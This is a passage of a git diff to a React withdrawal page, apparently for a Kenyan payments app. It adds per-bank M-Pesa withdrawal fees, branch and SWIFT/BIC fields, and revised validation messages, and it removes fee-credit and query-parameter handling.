-              payLabel={`Pay KES ${amountDueKes.toLocaleString()} via M-Pesa`}
-              onSuccess={handleInternationalFeeSuccess}
-            />
-          ) : (
-            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 12 }}>
-              Your previous fee credit covers the bank withdrawal fee. No additional M-Pesa fee is required.
-              <button className="pay-btn" style={{ background: '#000000', marginTop: 12 }} onClick={() => handleInternationalFeeSuccess({ checkoutRequestId: `credited-${Date.now()}` })}>
-                Continue
-              </button>
-            </div>
-          )
-        ) : (
-          <div style={{ textAlign: 'center', padding: 16 }}>
-            <span className="spinner" style={{ borderTopColor: '#000', borderColor: '#e5e7eb', width: 26, height: 26 }} />
-          </div>
-        )}
+        <MpesaPay
+          purpose="withdrawal_fee"
+          amount={selectedBankFeeKes}
+          defaultPhone={user?.phone || ''}
+          payLabel={`Pay KES ${selectedBankFeeKes.toLocaleString()} via M-Pesa`}
+          onSuccess={handleInternationalFeeSuccess}
+        />
 
         {sending && (
           <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
@@ -950,11 +881,7 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
   return (
     <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
       <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
-        {homeBanks.length ? (
-          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
-        ) : (
-          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
-        )}
+        Choose your bank and enter the complete bank details. There is no withdrawal minimum other than <strong>KES 100</strong>, and there is no KES 15,000 or KES 40,000 bank limit.
       </div>
 
       <div className="pay-phone-label">Account Holder Name</div>
@@ -1004,6 +931,12 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
       </div>
       {errors.bank && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}
 
+      {selectedBank && (
+        <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginTop: 12, fontSize: 13 }}>
+          Withdrawal fee for <strong>{selectedBank.name}</strong>: <strong>USD {selectedBankFeeUsd}</strong> ≈ <strong>KES {selectedBankFeeKes.toLocaleString()}</strong>.
+        </div>
+      )}
+
       <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
       <input className="pay-phone-input" type="text" value={accountNumber}
         onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
@@ -1011,31 +944,31 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
         style={{ borderColor: accountNumber && !acctValid ? '#4b5563' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
       {selectedBank && (
         <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#4b5563' : '#9ca3af' }}>
-          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Format for ${selectedBank.name}: ${selectedBank.ph}`}
+          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Use the account-number format required by ${selectedBank.name}: ${selectedBank.ph}`}
         </div>
       )}
+      {errors.accountNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountNumber}</div>}
+
+      <div className="pay-phone-label" style={{ marginTop: 16 }}>Branch</div>
+      <input className="pay-phone-input" type="text" value={branch}
+        onChange={e => { setBranch(e.target.value); setErrors(p => ({ ...p, branch: undefined })); }}
+        placeholder="e.g. Nairobi Main Branch" style={{ borderColor: errors.branch ? '#4b5563' : undefined }} />
+      {errors.branch && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.branch}</div>}
+
+      <div className="pay-phone-label" style={{ marginTop: 16 }}>SWIFT / BIC</div>
+      <input className="pay-phone-input" type="text" value={swiftCode}
+        onChange={e => { setSwiftCode(e.target.value.toUpperCase()); setErrors(p => ({ ...p, swiftCode: undefined })); }}
+        placeholder="e.g. KCBLKENX" style={{ borderColor: errors.swiftCode ? '#4b5563' : undefined }} />
+      {errors.swiftCode && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.swiftCode}</div>}
 
       <div className="pay-phone-label" style={{ marginTop: 16 }}>Withdrawal Amount (KES)</div>
-      <input
-        className="pay-phone-input"
-        type="number"
-        min="100"
-        max={balanceAmount}
-        step="1"
-        value={withdrawalAmount}
+      <input className="pay-phone-input" type="number" min="100" max={balanceAmount} step="1" value={withdrawalAmount}
         onChange={e => { setWithdrawalAmount(e.target.value); setErrors(p => ({ ...p, amount: undefined })); }}
-        placeholder="e.g. 100"
-        style={{ borderColor: withdrawalAmount && !amountValid ? '#4b5563' : undefined }}
-      />
+        placeholder="e.g. 100" style={{ borderColor: withdrawalAmount && !amountValid ? '#4b5563' : undefined }} />
       <div style={{ fontSize: 12, marginTop: 4, color: amountValid ? '#9ca3af' : '#4b5563' }}>
         Enter any amount from KES 100 up to your available balance of KES {balanceAmount.toLocaleString()}.
       </div>
       {errors.amount && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.amount}</div>}
-      {!amountValid && withdrawalAmount !== '' && (
-        <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>
-          Withdrawal amount must be at least KES 100 and cannot exceed your available balance.
-        </div>
-      )}
 
       {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 12 }}>{errors.form}</div>}
       {formValid ? (
@@ -1045,12 +978,16 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
       ) : (
         <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
           {!accountName.trim()
-            ? 'Enter your name to continue'
+            ? 'Enter the account holder name to continue'
             : !selectedBank
               ? 'Select your bank to continue'
               : !acctValid
-                ? 'Enter a valid account number to continue'
-                : 'Enter a valid withdrawal amount (KES 100 minimum) to continue'}
+                ? 'Enter the correct account number for the selected bank'
+                : !branch.trim()
+                  ? 'Enter the bank branch to continue'
+                  : !swiftCode.trim()
+                    ? 'Enter the SWIFT/BIC to continue'
+                    : 'Enter a valid withdrawal amount (KES 100 minimum) to continue'}
         </div>
       )}
       <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
@@ -1070,11 +1007,9 @@ export default function WithdrawPage() {
     return <FlowSkeleton rows={3} />;
   }
 
-  const psref = typeof router.query.psref === 'string' ? router.query.psref : '';
-  const bulkRedirect = router.query.bulk === '1';
 
   if (method === 'mpesa') {
-    return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
+    return <MpesaFlow user={user} />;
   }
 
   if (method === 'postbank') {
@@ -1082,12 +1017,7 @@ export default function WithdrawPage() {
   }
 
   if (method === 'international') {
-    return <InternationalFlow
-      user={user}
-      initialStep="form"
-      initialFeeRef={stepQ === 'form' ? psref : ''}
-      bulkRedirect={bulkRedirect}
-    />;
+    return <InternationalFlow user={user} />;
   }
 
   // Chooser. Both withdrawal methods remain available regardless of balance.
